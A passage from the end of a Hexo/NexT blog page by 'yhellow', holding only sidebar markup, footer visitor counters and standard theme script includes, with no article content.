        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="yhellow"
      src="/images/avatar.gif">
  <p class="site-author-name" itemprop="name">yhellow</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">187</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">10</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">116</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 2019 – 
  <span itemprop="copyrightYear">2022</span>
  <span class="with-love">
    <i class="heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">yhellow</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-area"></i>
    </span>
    <span title="Symbols count total">2.4m</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="Reading time total">37:04</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a>
  </div>

        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="user"></i>
      </span>
      <span class="site-uv" title="Total Visitors">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="eye"></i>
      </span>
      <span class="site-pv" title="Total Views">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

  

</body>
</html>
